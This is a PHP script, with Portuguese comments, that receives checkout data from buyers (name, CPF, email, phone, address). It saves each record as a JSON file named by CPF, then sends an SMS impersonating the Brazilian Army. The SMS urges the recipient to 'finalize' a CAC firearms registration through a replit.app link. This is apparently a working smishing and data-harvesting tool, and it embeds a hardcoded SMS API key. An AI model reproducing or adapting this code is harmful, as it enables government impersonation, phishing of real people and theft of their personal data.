<?php
// Receber os dados do checkout
$data = json_decode(file_get_contents('php://input'), true);

// Verificar se os dados foram recebidos corretamente
if ($data && isset($data['customer'])) {
    // Obter os dados necessários
    $customerData = [
        'name' => $data['customer']['name'],
        'cpf' => preg_replace('/[^0-9]/', '', $data['customer']['document']),
        'email' => $data['customer']['email'],
        'phone' => preg_replace('/[^0-9]/', '', $data['customer']['phone']),
        'address' => [
            'street' => $data['address']['street'],
            'number' => $data['address']['number'],
            'district' => $data['address']['district'],
            'city' => $data['address']['city'],
            'state' => $data['address']['state'],
            'zip_code' => $data['address']['zip_code']
        ],
        'purchase' => [
            'transaction_id' => $data['transaction_id'],
            'total_price' => $data['total_price'],
            'status' => $data['status'],
            'created_at' => $data['created_at']
        ]
    ];

    // Criar diretório se não existir
    $directory = 'customers';
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    // Salvar dados em arquivo JSON
    $filename = $directory . '/' . $customerData['cpf'] . '.json';
    file_put_contents($filename, json_encode($customerData, JSON_PRETTY_PRINT));

    // Preparar dados para SMS
    $nome = explode(' ', $customerData['name'])[0];
    $telefoneFormatado = "55" . $customerData['phone'];

    // Mensagem a ser enviada
    $mensagem = "EXERCITO: [FINALIZAR CAC] $nome, para finalizar o seu registro CAC, realize o agendamento do seu EXAME PRATICO no link: https://exercito-exame.replit.app/";

    // Enviar o SMS usando a nova API
    enviarSMS($telefoneFormatado, $mensagem);

    echo "Dados salvos com sucesso!";
} else {
    echo "Dados inválidos ou incompletos.";
}

function enviarSMS($numeroDestino, $mensagem) {
    // Chave da API (deixe manual para inserir diretamente)
    $apiKey = 'W5L6PZALNW7M9J1RRNLK77PBB1AZ8SUSF6NHO0HCWLE3K3J6FNRHQLV76V6XS5D23U4XKJ4N80NRA8IQO1HYDQ0M2TFG6VEZFI04MNUONE91UDYVXNW5VDP5NJDQEJNO'; // Substitua por sua chave antes de rodar o código

    // URL da API
    $url = "https://api.smsdev.com.br/v1/send";

    // Montar os parâmetros da URL
    $params = http_build_query([
        'key' => $apiKey,
        'type' => 9, // Define o tipo de envio como texto simples
        'number' => $numeroDestino,
        'msg' => $mensagem
    ]);

    // Fazer a requisição GET
    $fullUrl = $url . '?' . $params;
    $result = file_get_contents($fullUrl);

    if ($result === FALSE) {
        echo "Falha ao enviar SMS.";
    } else {
        echo "SMS enviado com sucesso!";
    }
}
?>